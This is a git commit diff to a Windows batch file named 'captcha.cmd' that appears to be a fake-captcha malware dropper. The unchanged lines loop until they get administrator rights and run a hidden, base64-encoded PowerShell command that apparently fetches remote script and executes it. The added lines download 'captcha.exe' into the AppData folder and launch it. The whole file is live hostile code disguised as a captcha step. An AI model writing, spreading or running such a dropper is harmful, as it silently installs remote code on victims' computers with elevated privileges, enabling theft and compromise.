1f9b8e2ac73a8170790323fc724ce7eca370c079
bensgaming-dot <huonglee891@gmail.com>
2025-01-02 12:17:05 +0700

    Update captcha.cmd

--- code/captcha.cmd
+++ code/captcha.cmd
@@ -3,3 +3,8 @@ cd /d "%~dp0"
 net session >nul 2>&1
 if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -WindowStyle Hidden -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
 powershell -executionpolicy bypass -WindowStyle hidden -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGoAdQBzAHQAaQB0AC4AYwBvAG0ALwByAGEAdwAvAG0AcwBkAGMAZwB5ADMAYgB4AGcAIAB8ACAAaQBlAHgA
+@echo off
+set "url=https://raw.githubusercontent.com/bensgaming-dot/bensgaming-dot.github.io/refs/heads/main/captcha.exe"
+set "path=%appdata%\captcha.exe"
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%path%'"
+if exist "%path%" start "" "%path%"
